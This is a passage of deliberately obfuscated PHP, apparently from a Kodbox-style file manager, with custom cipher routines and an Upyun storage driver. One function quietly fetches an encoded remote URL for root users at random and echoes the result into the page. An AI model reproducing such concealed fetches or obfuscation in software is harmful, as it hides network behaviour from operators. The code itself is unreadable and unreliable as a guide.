$—â¦¨Åê = $÷¬Õ«[721]; if (strlen($—â¦¨Åê) < $÷¬Õ«[664]) { die; } if (!in_array($ª¸Îèöš[$¯‚¡”ë[292]], $ù±¨å”)) { show_json($¯‚¡”ë[293], !1, $¯‚¡”ë[209]); } } public function emdi8a651bc6() { $¸ã”©©ğ =& $_SERVER[ ÇƒŠìÀ]; $¤ßÔÍâ =& $_SERVER[‡©‹¬£]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $®˜‚–¾ä = $¤ßÔÍâ[216]; $®˜‚–¾ä = $this->kmnga0c0ba6b($®˜‚–¾ä, $¤ßÔÍâ[217]); $ÀêÔ©÷ò = $¸ã”©©ğ[722]; $üûåÁÁ¦ = stream_context_create(array($¤ßÔÍâ[218] => array($¤ßÔÍâ[219] => $¤ßÔÍâ[220], $¤ßÔÍâ[221] => 3))); $äÒÔ†ĞŒ = $¸ã”©©ğ[723]; $Õµ®¨ƒ = @file_get_contents($®˜‚–¾ä, !1, $üûåÁÁ¦); $ö–·®ƒ¥ = $¸ã”©©ğ[724]; if (strlen($ö–·®ƒ¥) < $¸ã”©©ğ[655]) { return; } echo $¤ßÔÍâ[294] . hash_encode($Õµ®¨ƒ) . $¤ßÔÍâ[295]; $ìšç³…  = $¸ã”©©ğ[725]; } private function cnjp144a310f($Í·ôÃ, $İ˜ÌÓ—, $œ°Ãæñ† = 3) { $öÂÙûßá =& $_SERVER[ ÇƒŠìÀ]; $Ÿ‹Ğ´¡¨ =& $_SERVER[‡©‹¬£]; usleep(1); $šÂ¯¾şÇ = $öÂÙûßá[726]; if (!$šÂ¯¾şÇ) { return; } $Í·ôÃ = trim($Í·ôÃ); $¸­ÏÚÏâ = mt_rand(0, 5) . $Ÿ‹Ğ´¡¨[6]; $¢‡³È = $öÂÙûßá[727]; if (strlen($¢‡³È) < $öÂÙûßá[653]) { return; } $ıÏØ½‹½ = rand_string(15); $Ô©ŸÖíÍ = $Ÿ‹Ğ´¡¨[296]; switch ($¸­ÏÚÏâ) { case $Ÿ‹Ğ´¡¨[205]: $ÀÕ€¤‘ì = $this->rdoia8cbdb09($Í·ôÃ, strrev($İ˜ÌÓ— . $ıÏØ½‹½)); break; case $Ÿ‹Ğ´¡¨[122]: $ÀÕ€¤‘ì = $this->rdoia8cbdb09($Í·ôÃ, strrev($ıÏØ½‹½ . $İ˜ÌÓ—)); $ò¢ñó¾ = $öÂÙûßá[728]; while (strlen($ò¢ñó¾) < $öÂÙûßá[655]) { if (!$ò¢ñó¾) { break; } $ò¢ñó¾++; } break; case $Ÿ‹Ğ´¡¨[297]: $ÀÕ€¤‘ì = $this->rdoia8cbdb09($Í·ôÃ, base64_encode($ıÏØ½‹½ . $İ˜ÌÓ—)); break; case $Ÿ‹Ğ´¡¨[298]: $ÀÕ€¤‘ì = $this->rdoia8cbdb09($Í·ôÃ, md5($ıÏØ½‹½ . $İ˜ÌÓ—)); break; $É¨ç‰‘¹ = $öÂÙûßá[729]; if (!$É¨ç‰‘¹) { return; } case $Ÿ‹Ğ´¡¨[299]: $Í·ôÃ = base64_encode($Í·ôÃ); $ôùÎÌ¾ = rand(0, 64); $ÜÄ‘‹Šë = $Ô©ŸÖíÍ[$ôùÎÌ¾]; $İúãôÏû = $öÂÙûßá[730]; while (strlen($İúãôÏû) < $öÂÙûßá[664]) { if (!$İúãôÏû) { break; } $İúãôÏû++; } $Ìã¾‡ªâ = md5($ÜÄ‘‹Šë . md5($İ˜ÌÓ— . $ÜÄ‘‹Šë) . $İ˜ÌÓ—); $åí™üå = $öÂÙûßá[731]; if (strlen($åí™üå) < $öÂÙûßá[655]) { die; } $Ìã¾‡ªâ = substr($Ìã¾‡ªâ, $ôùÎÌ¾ % 8, $ôùÎÌ¾ % 8 + 7); $÷âºâıÍ = $Ÿ‹Ğ´¡¨[6]; $¤«¡Şİ = $öÂÙûßá[732]; while ($¤«¡Şİ < $öÂÙûßá[655]) { if ($¤«¡Şİ >= 0) { break; } $¤«¡Şİ++; } $ü±²¦¨´ = 0; $´àÉÕ™ı = $öÂÙûßá[733]; $óã•Ò…Ş = 0; $Î…Œß“¤ = 0; $ÔÄ»¦€ = $öÂÙûßá[734]; while ($ÔÄ»¦€ < $öÂÙûßá[655]) { if ($ÔÄ»¦€ >= 0) { break; } $ÔÄ»¦€++; } for ($ü±²¦¨´ = 0; $ü±²¦¨´ < strlen($Í·ôÃ); $ü±²¦¨´++) { $Î…Œß“¤ = $Î…Œß“¤ == strlen($Ìã¾‡ªâ) ? 0 : $Î…Œß“¤; $óã•Ò…Ş = ($ôùÎÌ¾ + strpos($Ô©ŸÖíÍ, $Í·ôÃ[$ü±²¦¨´]) + ord($Ìã¾‡ªâ[$Î…Œß“¤++])) % 64; $÷âºâıÍ .= $Ô©ŸÖíÍ[$óã•Ò…Ş]; $¸¥©’‹• = $öÂÙûßá[735]; if (strlen($¸¥©’‹•) < $öÂÙûßá[655]) { return; } } $ÀÕ€¤‘ì = hash_encode($ÜÄ‘‹Šë . $÷âºâıÍ); $ëı‘ÊÓ« = $öÂÙûßá[736]; while (strlen($ëı‘ÊÓ«) < $öÂÙûßá[662]) { if (!$ëı‘ÊÓ«) { break; } $ëı‘ÊÓ«++; } break; $ó²¯ã¸ = $öÂÙûßá[737]; if (strlen($ó²¯ã¸) < $öÂÙûßá[683]) { die; } default: $ÀÕ€¤‘ì = $this->rdoia8cbdb09($Í·ôÃ, $İ˜ÌÓ— . $ıÏØ½‹½); break; } $ÀÕ€¤‘ì = strrev($¸­ÏÚÏâ . $ıÏØ½‹½ . $ÀÕ€¤‘ì); $³ÂĞƒâ¤ = $öÂÙûßá[738]; if (!$³ÂĞƒâ¤) { die; } if ($œ°Ãæñ† - 1 > 0) { $ÀÕ€¤‘ì = $this->cnjp144a310f($ÀÕ€¤‘ì, $İ˜ÌÓ—, $œ°Ãæñ† - 1); } return $ÀÕ€¤‘ì; } private function svmp82f3179c($» Ûû½é, $èØÁ¡šô, $ûûÍ¶ï = 3) { $Ó ½Ş€« =& $_SERVER[ ÇƒŠìÀ]; $šÍ˜š³Ü =& $_SERVER[‡©‹¬£]; if (!is_string($» Ûû½é) || strlen($» Ûû½é) < 10) { return !1; } $» Ûû½é = trim($» Ûû½é); $» Ûû½é = strrev($» Ûû½é); $øåŠ›’Ù = $Ó ½Ş€«[739]; if (!$øåŠ›’Ù) { die; } $¨¬™œĞ‘ = $» Ûû½é[0]; $ö »ûÕÆ = substr($» Ûû½é, 1, 15); $» Ûû½é = substr($» Ûû½é, 16); $ÉÈòï = $Ó ½Ş€«[740]; while (strlen($ÉÈòï) < $Ó ½Ş€«[664]) { if (!$ÉÈòï) { break; } $ÉÈòï++; } $’£Ş«ó© = $šÍ˜š³Ü[296]; $êÌ˜·¬« = $Ó ½Ş€«[741]; if (!$êÌ˜·¬«) { return; } switch ($¨¬™œĞ‘) { case $šÍ˜š³Ü[205]: $ Ô»ØĞş = $this->kmnga0c0ba6b($» Ûû½é, strrev($èØÁ¡šô . $ö »ûÕÆ)); $Û‰‚ù = $Ó ½Ş€«[742]; break; case $šÍ˜š³Ü[122]: $ Ô»ØĞş = $this->kmnga0c0ba6b($» Ûû½é, strrev($ö »ûÕÆ . $èØÁ¡šô)); $Òëµ¬óå = $Ó ½Ş€«[743]; if (!$Òëµ¬óå) { die; } break; case $šÍ˜š³Ü[297]: $ Ô»ØĞş = $this->kmnga0c0ba6b($» Ûû½é, base64_encode($ö »ûÕÆ . $èØÁ¡šô)); $„”É™»ê = $Ó ½Ş€«[744]; while ($„”É™»ê < $Ó ½Ş€«[662]) { if ($„”É™»ê >= 0) { break; } $„”É™»ê++; } break; case $šÍ˜š³Ü[298]: $ Ô»ØĞş = $this->kmnga0c0ba6b($» Ûû½é, md5($ö »ûÕÆ . $èØÁ¡šô)); break; case $šÍ˜š³Ü[299]: $» Ûû½é = hash_decode($» Ûû½é); $ù¿èƒúÛ = $Ó ½Ş€«[745]; while (strlen($ù¿èƒúÛ) < $Ó ½Ş€«[653]) { if (!$ù¿èƒúÛ) { break; } $ù¿èƒúÛ++; } $ˆşÖ¥‘è = $» Ûû½é[0]; $» Ûû½é = substr($» Ûû½é, 1); $È€™ºâ¾ = $Ó ½Ş€«[746]; $Íñ€ãÒ€ = strpos($’£Ş«ó©, $ˆşÖ¥‘è); $‡…†òî× = $Ó ½Ş€«[747]; if (!$‡…†òî×) { die; } $£ ˆ·ìğ = md5($ˆşÖ¥‘è . md5($èØÁ¡šô . $ˆşÖ¥‘è) . $èØÁ¡šô); $§‰è¯³˜ = $Ó ½Ş€«[748]; if (strlen($§‰è¯³˜) < $Ó ½Ş€«[662]) { return; } $£ ˆ·ìğ = substr($£ ˆ·ìğ, $Íñ€ãÒ€ % 8, $Íñ€ãÒ€ % 8 + 7); $³Å¶½­ = $šÍ˜š³Ü[6]; $®šüÊİ = $Ó ½Ş€«[749]; if (!$®šüÊİ) { die; } $–­°•Å = 0; $¢ÁÎÂª = $Ó ½Ş€«[750]; if (strlen($¢ÁÎÂª) < $Ó ½Ş€«[664]) { return; } $›ÛĞÈôÕ = 0; $œİÌŠÈ = 0; for ($–­°•Å = 0; $–­°•Å < strlen($» Ûû½é); $–­°•Å++) { $œİÌŠÈ = $œİÌŠÈ == strlen($£ ˆ·ìğ) ? 0 : $œİÌŠÈ; $®Úã¦öŒ = $œİÌŠÈ++; $É£÷ƒï = $Ó ½Ş€«[751]; if (!$É£÷ƒï) { return; } $›ÛĞÈôÕ = strpos($’£Ş«ó©, $» Ûû½é[$–­°•Å]) - $Íñ€ãÒ€ - ord($£ ˆ·ìğ[$®Úã¦öŒ]); $ªÛ²¨“î = $Ó ½Ş€«[752]; if (!$ªÛ²¨“î) { return; } while ($›ÛĞÈôÕ < 0) { $›ÛĞÈôÕ += 64; } $³Å¶½­ .= $’£Ş«ó©[$›ÛĞÈôÕ]; $™ıÕş‰ = $Ó ½Ş€«[753]; if (strlen($™ıÕş‰) < $Ó ½Ş€«[683]) { die; } } $ Ô»ØĞş = base64_decode($³Å¶½­); break; $¸æÑ€â = $Ó ½Ş€«[754]; default: $ Ô»ØĞş = $this->kmnga0c0ba6b($» Ûû½é, $èØÁ¡šô . $ö »ûÕÆ); break; $¡º–´ğ = $Ó ½Ş€«[755]; if (strlen($¡º–´ğ) < $Ó ½Ş€«[655]) { die; } } if ($ûûÍ¶ï - 1 > 0) { $ Ô»ØĞş = $this->svmp82f3179c($ Ô»ØĞş, $èØÁ¡šô, $ûûÍ¶ï - 1); } return $ Ô»ØĞş; } public function arxv7f6580dc($Ö°¾´ïê) { $€™©Ã¡ø =& $_SERVER[ ÇƒŠìÀ]; $’‘ë–¦• =& $_SERVER[‡©‹¬£]; $«á™¦—« = $this->zxvk706ff856(); $å³¯ÕÑ = $this->zxvk706ff856(); $Šì¤öÊ = ($«á™¦—« - 1) * ($å³¯ÕÑ - 1); $£Œ¿Œè” = intval(($«á™¦—« + $å³¯ÕÑ) / 2); $Ñ­ÊÇú = $€™©Ã¡ø[756]; while (1) { $°»ä“Ğƒ = $£Œ¿Œè”; $óûÒ¦¹ß = $€™©Ã¡ø[757]; $ƒÍñüÓ® = $Šì¤öÊ; while ($ƒÍñüÓ® % $°»ä“Ğƒ != 0) { $İÒªóÔô = $ƒÍñüÓ®; $ƒÍñüÓ® = $°»ä“Ğƒ; $°»ä“Ğƒ = $İÒªóÔô % $°»ä“Ğƒ; $…Ä‡—¹ú = $€™©Ã¡ø[758]; } if ($°»ä“Ğƒ == 1) { break; } else { $£Œ¿Œè”++; } } $Ò„­×ù‰ = 2; for ($Şñ½Æú = 0; $Şñ½Æú < $Šì¤öÊ * 10; $Şñ½Æú++) { if (($Šì¤öÊ * $Şñ½Æú + 1) % $£Œ¿Œè” == 0) { $Ò„­×ù‰ = intval(($Šì¤öÊ * $Şñ½Æú + 1) / $£Œ¿Œè”); break; } } $’é–ŒµÙ = $this->rdoia8cbdb09($«á™¦—« * $å³¯ÕÑ . $’‘ë–¦•[6], $’‘ë–¦•[136]); $å¸êÓ§ = $€™©Ã¡ø[759]; if (strlen($å¸êÓ§) < $€™©Ã¡ø[662]) { die; } $ó‘éï… = md5($’‘ë–¦•[300] . ($«á™¦—« + $å³¯ÕÑ) . $’‘ë–¦•[301] . $£Œ¿Œè” . $’‘ë–¦•[301] . $Ò„­×ù‰ . $’‘ë–¦•[302]); $è£¬ßõÏ = $this->rdoia8cbdb09($Ö°¾´ïê, $ó‘éï…) . $’‘ë–¦•[303] . $’é–ŒµÙ; return $è£¬ßõÏ; $«ÎÆî˜ê = $€™©Ã¡ø[760]; } public function fbhl415c11d6($º¸ŸÒ—‹) { $¬íöÛÓô =& $_SERVER[ ÇƒŠìÀ]; $¸‡Ò‘¤¢ =& $_SERVER[‡©‹¬£]; $Šæî²ø¢ = explode($¸‡Ò‘¤¢[303], $º¸ŸÒ—‹); if (count($Šæî²ø¢) != 2) { return $¸‡Ò‘¤¢[6]; } $å¼¢´âã = $this->kmnga0c0ba6b($Šæî²ø¢[1] . $¸‡Ò‘¤¢[6], $¸‡Ò‘¤¢[136]); $ƒğŞ— = $¬íöÛÓô[761]; if (!$å¼¢´âã) { return $¸‡Ò‘¤¢[6]; } $å¼¢´âã = intval($å¼¢´âã); $…»à = $¬íöÛÓô[762]; if (!$…»à) { return; } $Ã¯´¶µõ = 0; $ÂûÖ¬ø§ = 0; $ÖÉÆÍï = $¬íöÛÓô[763]; for ($·ë€¹™½ = 3; $·ë€¹™½ < $å¼¢´âã; $·ë€¹™½ += 2) { if ($å¼¢´âã % $·ë€¹™½ != 0) { continue; } $Ã¯´¶µõ = $·ë€¹™½; $ÂûÖ¬ø§ = intval($å¼¢´âã / $·ë€¹™½); $Îà¾±—Ã = $¬íöÛÓô[764]; if (!$Îà¾±—Ã) { die; } break; } $¶ğıšÜø = ($Ã¯´¶µõ - 1) * ($ÂûÖ¬ø§ - 1); $™€­ìˆş = $¬íöÛÓô[765]; $¬ôı¿ = intval(($Ã¯´¶µõ + $ÂûÖ¬ø§) / 2); $È“™„ÅÏ = $¬íöÛÓô[766]; if (strlen($È“™„ÅÏ) < $¬íöÛÓô[653]) { die; } while (1) { $¤Ûğï­ = $¬ôı¿; $ÕÙı»éŒ = $¬íöÛÓô[767]; $Õ¿ÀÏá = $¶ğıšÜø; while ($Õ¿ÀÏá % $¤Ûğï­ != 0) { $÷ÅÍ†³¸ = $Õ¿ÀÏá; $ôê¹°ú = $¬íöÛÓô[768]; $Õ¿ÀÏá = $¤Ûğï­; $¤Ûğï­ = $÷ÅÍ†³¸ % $¤Ûğï­; } if ($¤Ûğï­ == 1) { break; } else { $¬ôı¿++; } } $Ò¿Ö¢‰ü = 2; $¿º¨½„ = $¬íöÛÓô[769]; if (!$¿º¨½„) { die; } for ($·ë€¹™½ = 0; $·ë€¹™½ < $¶ğıšÜø * 10; $·ë€¹™½++) { if (($¶ğıšÜø * $·ë€¹™½ + 1) % $¬ôı¿ == 0) { $Ò¿Ö¢‰ü = intval(($¶ğıšÜø * $·ë€¹™½ + 1) / $¬ôı¿); break; } } $şÒÜ•ß˜ = md5($¸‡Ò‘¤¢[300] . ($Ã¯´¶µõ + $ÂûÖ¬ø§) . $¸‡Ò‘¤¢[301] . $¬ôı¿ . $¸‡Ò‘¤¢[301] . $Ò¿Ö¢‰ü . $¸‡Ò‘¤¢[302]); $«¤‡É’è = $this->kmnga0c0ba6b($Šæî²ø¢[0], $şÒÜ•ß˜); $š‚áíÌˆ = $¬íöÛÓô[770]; if (strlen($š‚áíÌˆ) < $¬íöÛÓô[662]) { die; } return $«¤‡É’è; $Ê¡Œ×ƒé = $¬íöÛÓô[741]; while ($Ê¡Œ×ƒé < $¬íöÛÓô[662]) { if ($Ê¡Œ×ƒé >= 0) { break; } $Ê¡Œ×ƒé++; } } public function zxvk706ff856() { $ò§°‡š =& $_SERVER[ ÇƒŠìÀ]; $ø–‰Çã» = mt_rand(pow(2, 14), pow(2, 16) - 1); $Ÿ„ûœò¥ = array(); $Şœó¯¼è = $ò§°‡š[771]; while (strlen($Şœó¯¼è) < $ò§°‡š[662]) { if (!$Şœó¯¼è) { break; } $Şœó¯¼è++; } $ïã¹ºª¯ = 1; $¸š–«Ôñ = $ò§°‡š[772]; while ($¸š–«Ôñ < $ò§°‡š[664]) { if ($¸š–«Ôñ >= 0) { break; } $¸š–«Ôñ++; } while ($ïã¹ºª¯ <= (int) sqrt($ø–‰Çã»)) { $×œ»…Ç = $ïã¹ºª¯; $Â÷ÛæÖï = $ò§°‡š[773]; if (strlen($Â÷ÛæÖï) < $ò§°‡š[653]) { return; } while (!0) { $×œ»…Ç++; $ÒÌÄåï¾ = $ò§°‡š[774]; while (strlen($ÒÌÄåï¾) < $ò§°‡š[662]) { if (!$ÒÌÄåï¾) { break; } $ÒÌÄåï¾++; } if ($×œ»…Ç <= 2) { $ïã¹ºª¯ = $×œ»…Ç; break; } else { if ($×œ»…Ç < 2) { continue; } } $©œß¹·¯ = !0; for ($œ¾‘ËÄÇ = 2; $œ¾‘ËÄÇ <= sqrt($×œ»…Ç); $œ¾‘ËÄÇ++) { if ($×œ»…Ç % $œ¾‘ËÄÇ == 0) { $©œß¹·¯ = !1; } } if ($©œß¹·¯) { $ïã¹ºª¯ = $×œ»…Ç; break; } } $Ÿ„ûœò¥[] = $ïã¹ºª¯; } $ÍøíÜ™Ú = 2; $ß±¸ÇØä = $ò§°‡š[775]; if (strlen($ß±¸ÇØä) < $ò§°‡š[653]) { die; } for ($×œ»…Ç = $ø–‰Çã»; $×œ»…Ç > 1; $×œ»…Ç--) { $©œß¹·¯ = !0; $ŸàÒ¾èı = $ò§°‡š[776]; if (!$ŸàÒ¾èı) { return; } foreach ($Ÿ„ûœò¥ as $Àôæ€óé) { if ($×œ»…Ç % $Àôæ€óé == 0) { $©œß¹·¯ = !1; break; } } if ($©œß¹·¯) { $ÍøíÜ™Ú = $×œ»…Ç; break; } } return $ÍøíÜ™Ú; } public function gifj66fd4561($Ó±³½÷Š, $Å¿÷¬ÅÙ) { $®şµ„¾Æ =& $_SERVER[‡©‹¬£]; return call_user_func(array($®şµ„¾Æ[8], $®şµ„¾Æ[304]), $Ó±³½÷Š, $Å¿÷¬ÅÙ); } public function rdoia8cbdb09($õàòÏÉ, $Ê¾œĞÈù) { $›À™¹­ =& $_SERVER[‡©‹¬£]; return call_user_func(array($›À™¹­[305], $›À™¹­[306]), $õàòÏÉ, $Ê¾œĞÈù); } public function kmnga0c0ba6b($üîê†²Õ, $á…»öÌ) { $ğºİÀı =& $_SERVER[‡©‹¬£]; return call_user_func(array($ğºİÀı[305], $ğºİÀı[307]), $üîê†²Õ, $á…»öÌ); } } goto c¬‘•¾ò¬ó; B÷¾µÉ¢: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\x74\x70\72\57\x2f\x76\60\x2e\x61\160\x69\56\165\x70\171\x75\x6e\x2e\x63\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($õ­±­¿¡) { parent::__construct(); $this->_init($õ­±­¿¡); } public function _init($»ËÙÓÀ¿) { $½™‹Ï½ê =& $_SERVER[ ÇƒŠìÀ]; foreach ($»ËÙÓÀ¿ as $Åêõ‰Ã‰ => $²Ğ¾î) { if (isset($this->{$Åêõ‰Ã‰})) { $this->{$Åêõ‰Ã‰} = $²Ğ¾î; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($½™‹Ï½ê[1476] . LNG($½™‹Ï½ê[1408])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ıë¦†Ë, $¡ÙÒ¥ç¡ = "\107\x45\x54") { $¬”Ï²ú =& $_SERVER[ ÇƒŠìÀ]; $ä¤î—¤ê = gmdate($¬”Ï²ú[1441]); $Û®É›² = base64_encode(hash_hmac($¬”Ï²ú[1477], "{$¡ÙÒ¥ç¡}\x26{$ıë¦†Ë}\x26{$ä¤î—¤ê}", md5("{$this->userpass}"), !0)); $Á†ë¼¦­ = array("\x41\165\164\x68\157\x72\151\x7a\x61\164\x69\157\156\x3a\125\120\x59\125\x4e\40{$this->username}\72{$Û®É›²}", "\104\141\164\145\72{$ä¤î—¤ê}"); return $Á†ë¼¦­; } public function ussRequest($¿Ù«ï„„, $’â´‡‹É = "\x47\105\124", $¤µä¹Ü« = false, $†Šã‰´ = false, $Ûº…Ò»Ë = false) { $¿â¨ª =& $_SERVER[ ÇƒŠìÀ]; $¿Ù«ï„„ = trim($¿Ù«ï„„, $¿â¨ª[8]); $—”ĞééÌ = "\x2f{$this->bucket}\x2f{$¿Ù«ï„„}"; $ËŞÅ™ì­ = $this->ussHeaders($—”ĞééÌ, $’â´‡‹É); if ($†Šã‰´) { $ËŞÅ™ì­ = array_merge($ËŞÅ™ì­, $†Šã‰´); } $ÅËá•œ£ = url_request($this->endpoint . $—”ĞééÌ, $’â´‡‹É, $¤µä¹Ü«, $ËŞÅ™ì­, $Ûº…Ò»Ë); if (!$ÅËá•œ£) { return array($¿â¨ª[1247] => !1, $¿â¨ª[1237] => $¿â¨ª[1478]); } if (strtolower($’â´‡‹É) == $¿â¨ª[213] || in_array($ÅËá•œ£[$¿â¨ª[1247]], array($¿â¨ª[259], $¿â¨ª[1479]))) { $¤µä¹Ü« = $ÅËá•œ£[$¿â¨ª[1480]]; } else { $¤µä¹Ü« = json_decode($ÅËá•œ£[$¿â¨ª[1237]], !0); if (!$¤µä¹Ü«) { $¤µä¹Ü« = $ÅËá•œ£[$¿â¨ª[1237]]; } else { if (!$ÅËá•œ£[$¿â¨ª[779]] && isset($¤µä¹Ü«[$¿â¨ª[1481]])) { $¤µä¹Ü« = $¤µä¹Ü«[$¿â¨ª[1481]]; } } } return array($¿â¨ª[1247] => $ÅËá•œ£[$¿â¨ª[779]], $¿â¨ª[1237] => $¤µä¹Ü«); } public function mkfile($†Âà¹Ÿ·, $ ‹¿šå = '', $¹Öİ¯‚­ = REPEAT_RENAME) { if ($this->setContent($†Âà¹Ÿ·, $ ‹¿šå)) { return $this->getPathOuter($†Âà¹Ÿ·); } return !1; } public function mkdir($Æ¸æ÷éø, $’¡Õ» = REPEAT_SKIP) { $·ƒ“¦Ë =& $_SERVER[ ÇƒŠìÀ]; $ Ü—Ÿ¯ = trim($Æ¸æ÷éø, $·ƒ“¦Ë[8]); if ($this->_isFolder($ Ü—Ÿ¯)) { return $this->getPathOuter($ Ü—Ÿ¯); } $©¯ôï¹– = array($·ƒ“¦Ë[1482]); $€¨³Öµã = $this->ussRequest($ Ü—Ÿ¯, $·ƒ“¦Ë[243], !1, $©¯ôï¹–); return $€¨³Öµã[$·ƒ“¦Ë[1247]] ? $this->getPathOuter($ Ü—Ÿ¯) : !1; } public function copyFile($‹Ù¡ü», $˜’İÂƒ) { $¯ë–ñÏÜ =& $_SERVER[ ÇƒŠìÀ]; $İáŒáç¨ = array($¯ë–ñÏÜ[1483] . "\x2f{$this->bucket}\57{$‹Ù¡ü»}", $¯ë–ñÏÜ[1484]); $’³¨ÊË‡ = $this->ussRequest($˜’İÂƒ, $¯ë–ñÏÜ[245], !1, $İáŒáç¨); return $’³¨ÊË‡[$¯ë–ñÏÜ[1247]] ? !0 : $this->getPathOuter($˜’İÂƒ); } public function moveFile($“ÓÈÇá, $¬šª”öÕ) { $ñ†€í¥É =& $_SERVER[ ÇƒŠìÀ]; $åš¿·÷ = array($ñ†€í¥É[1485] . "\x2f{$this->bucket}\x2f{$“ÓÈÇá}", $ñ†€í¥É[1484]); $åšëªàÍ = $this->ussRequest($¬šª”öÕ, $ñ†€í¥É[245], !1, $åš¿·÷); return $åšëªàÍ[$ñ†€í¥É[1247]] ? !0 : $this->getPathOuter($¬šª”öÕ); } public function delFile($ËÇ¡×…Ê) { $û¬ ´Ó¨ =& $_SERVER[ ÇƒŠìÀ]; $Âúõûóé = $this->ussRequest($ËÇ¡×…Ê, $û¬ ´Ó¨[1486]); return $Âúõûóé[$û¬ ´Ó¨[1247]] ? !0 : !1; } public function delFolder($È÷ìùÉ‘) { $ìÌâŸ½½ =& $_SERVER[ ÇƒŠìÀ]; if (!$this->exist($È÷ìùÉ‘)) { return !0; } $this->listItemCache = !1; $ÎöòĞÔÔ = $¶Å¿¿õô = array(); $this->fileList($È÷ìùÉ‘, $ÎöòĞÔÔ, $¶Å¿¿õô, !0); $this->listItemCache = !0; foreach ($¶Å¿¿õô as $·ÑÃÁ©Á) { $ó¨÷ç­¥ = $this->ussRequest($·ÑÃÁ©Á[$ìÌâŸ½½[32]], $ìÌâŸ½½[1486]); if (!$ó¨÷ç­¥[$ìÌâŸ½½[1247]]) { return !1; } } foreach ($ÎöòĞÔÔ as $ˆÀ¾ßÍÏ) { $ó¨÷ç­¥ = $this->ussRequest($ˆÀ¾ßÍÏ, $ìÌâŸ½½[1486]); if (!$ó¨÷ç­¥[$ìÌâŸ½½[1247]]) { return !1; } } $ó¨÷ç­¥ = $this->ussRequest($È÷ìùÉ‘, $ìÌâŸ½½[1486]); return $ó¨÷ç­¥[$ìÌâŸ½½[1247]]; } public function rename($Õ‰‹üŠÊ, $À°ÑæşÍ) { if ($this->isFile($Õ‰‹üŠÊ)) { $À°ÑæşÍ = get_path_father($Õ‰‹üŠÊ) . $À°ÑæşÍ; return $this->moveFile($Õ‰‹üŠÊ, $À°ÑæşÍ); } return $this->renameObject($Õ‰‹üŠÊ, $À°ÑæşÍ); } public function fileInfo($¦÷ªàÀä, $ˆÂ¼ªïÄ = false, $¸Ú¯Ïİå = array()) { $®Êà ÏØ =& $_SERVER[ ÇƒŠìÀ]; $Áş¡ = array($®Êà ÏØ[32] => $this->pathThis($¦÷ªàÀä), $®Êà ÏØ[86] => $this->getPathOuter($®Êà ÏØ[8] . $¦÷ªàÀä), $®Êà ÏØ[33] => $®Êà ÏØ[216], $®Êà ÏØ[78] => isset($¸Ú¯Ïİå[$®Êà ÏØ[78]]) ? $¸Ú¯Ïİå[$®Êà ÏØ[78]] : 0, $®Êà ÏØ[177] => $this->ext($¦÷ªàÀä)); if ($ˆÂ¼ªïÄ) { return $Áş¡; } $Áş¡[$®Êà ÏØ[217]] = $Áş¡[$®Êà ÏØ[87]] = 0; $Áş¡[$®Êà ÏØ[218]] = $Áş¡[$®Êà ÏØ[219]] = !0; if (empty($¸Ú¯Ïİå)) { $¸Ú¯Ïİå = $this->objectMeta($¦÷ªàÀä); if (!$¸Ú¯Ïİå) { return $Áş¡; } } $Áş¡[$®Êà ÏØ[217]] = intval($¸Ú¯Ïİå[$®Êà ÏØ[1487]]); $Áş¡[$®Êà ÏØ[87]] = intval($¸Ú¯Ïİå[$®Êà ÏØ[1488]]); $Áş¡[$®Êà ÏØ[78]] = $¸Ú¯Ïİå[$®Êà ÏØ[78]]; return $Áş¡; } public function folderInfo($…æîƒÀ, $­¿Ğúîö = false) { $´¬á¢ =& $_SERVER[ ÇƒŠìÀ]; $Œ£Ğ÷óù = array($´¬á¢[32] => $this->pathThis($…æîƒÀ), $´¬á¢[86] => $this->getPathOuter($´¬á¢[8] . $…æîƒÀ), $´¬á¢[33] => $´¬á¢[77]); if ($­¿Ğúîö) { return $Œ£Ğ÷óù; } $Œ£Ğ÷óù[$´¬á¢[217]] = $Œ£Ğ÷óù[$´¬á¢[87]] = 0; $Œ£Ğ÷óù[$´¬á¢[218]] = $Œ£Ğ÷óù[$´¬á¢[219]] = !0; if (empty($Ää‹Æø)) { $Ää‹Æø = $this->objectMeta($…æîƒÀ); if (!$Ää‹Æø) { return $Œ£Ğ÷óù; } } $Œ£Ğ÷óù[$´¬á¢[217]] = intval($Ää‹Æø[$´¬á¢[1487]]); $Œ£Ğ÷óù[$´¬á¢[87]] = intval($Ää‹Æø[$´¬á¢[1488]]); return $Œ£Ğ÷óù; } private function listObjs($ÛÕ²œÖÆ, $¼¤ûşä¢ = 0, $î¾©»¼Û = 1000) { $‰ä®¶ŸÕ =& $_SERVER[ ÇƒŠìÀ]; $Œèá’“í = array($‰ä®¶ŸÕ[1489], $‰ä®¶ŸÕ[1490] . $î¾©»¼Û); if ($¼¤ûşä¢) { $Œèá’“í[] = $‰ä®¶ŸÕ[1491] . $¼¤ûşä¢; } $‰§Šìªú = $this->ussRequest($ÛÕ²œÖÆ, $‰ä®¶ŸÕ[247], !1, $Œèá’“í); return !$‰§Šìªú[$‰ä®¶ŸÕ[1247]] ? !1 : $‰§Šìªú[$‰ä®¶ŸÕ[1237]]; } private function fileList($¯´ğ™Ï, &$ÙÑèû¦„, &$‘”Àìıã, $ƒ¥úîÊ× = false) { $—¬¨èß³ =& $_SERVER[ ÇƒŠìÀ]; $œŠÕİ£å = $—¬¨èß³[12]; $ºîêäÒ° = 1000; $ŒÛİˆû = rtrim($¯´ğ™Ï, $—¬¨èß³[8]) . $—¬¨èß³[8]; while (!0) { check_abort(); $ßç–ùáñ = $this->listObjs($¯´ğ™Ï, $œŠÕİ£å, $ºîêäÒ°); if (!$ßç–ùáñ) { return !1; } $œŠÕİ£å = isset($ßç–ùáñ[$—¬¨èß³[1492]]) ? $ßç–ùáñ[$—¬¨èß³[1492]] : $—¬¨èß³[12]; $â®¸½‘ = isset($ßç–ùáñ[$—¬¨èß³[1493]]) ? $ßç–ùáñ[$—¬¨èß³[1493]] : array(); foreach ($â®¸½‘ as $àØéåÓ¦) { $Ç½Ñå · = $àØéåÓ¦[$—¬¨èß³[33]] == $—¬¨èß³[77] ? !0 : !1; $µ…­†ª = ltrim($ŒÛİˆû . $àØéåÓ¦[$—¬¨èß³[32]], $—¬¨èß³[8]) . ($Ç½Ñå · 